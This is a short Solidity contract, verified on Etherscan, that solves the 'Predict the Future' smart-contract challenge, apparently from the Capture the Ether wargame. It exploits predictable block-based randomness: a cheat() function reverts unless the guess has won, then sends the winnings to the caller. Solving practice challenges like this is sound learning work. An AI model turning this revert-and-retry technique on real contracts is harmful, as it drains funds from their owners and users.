/**
 *Submitted for verification at Etherscan.io on 2022-08-17
*/

pragma solidity ^0.7.3;

interface IPredictTheFutureChallenge {
    function isComplete() external view returns (bool);

    function lockInGuess(uint8 n) external payable;

    function settle() external;
}

contract PredictTheFutureAttacker {
    IPredictTheFutureChallenge public challenge;

    constructor(address challengeAddress) {
        challenge = IPredictTheFutureChallenge(challengeAddress);     // 0x66d7bdD4eB6CaC074b4BC0A21d3E915f1e96fdEb
    }

     function lockInGuess(uint8 n) external payable {
        // need to call it from this contract because guesser is stored and checked
        // when settling
        challenge.lockInGuess{value: 1 ether}(n);
    }

    function cheat() public {
        challenge.settle();
        require (   challenge.isComplete()  , "failed"    ) ; 
        tx.origin.transfer(address(this).balance);
        
    }
    receive() external payable {}
}